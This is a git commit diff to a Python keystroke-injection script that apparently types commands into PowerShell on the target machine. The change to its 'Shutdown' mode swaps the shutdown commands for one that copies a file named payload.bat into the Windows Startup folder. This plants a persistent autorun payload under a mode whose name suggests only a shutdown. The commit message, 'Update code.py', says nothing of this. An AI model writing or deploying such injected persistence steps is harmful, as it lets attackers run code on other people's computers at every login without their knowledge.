3808d0c694e9191c66d86790bf9db05de6bd90a2
Isaac Richardson <134805131+LindenLaboratory@users.noreply.github.com>
2024-08-21 15:37:26 +0100

    Update code.py

--- Choir/code.py
+++ Choir/code.py
@@ -70,7 +70,7 @@ elif mode == "Shutdown":
     layout.write('powershell\n')
     time.sleep(1)
     layout.write(f'{";".join(lst)}\n')
-    layout.write('./shutdown.bat\nshutdown /p\n')
+    layout.write('copy "\Borealis\Assets\payload.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"')
 else:
     print("Not Accepted Mode")
     time.sleep(2.5)
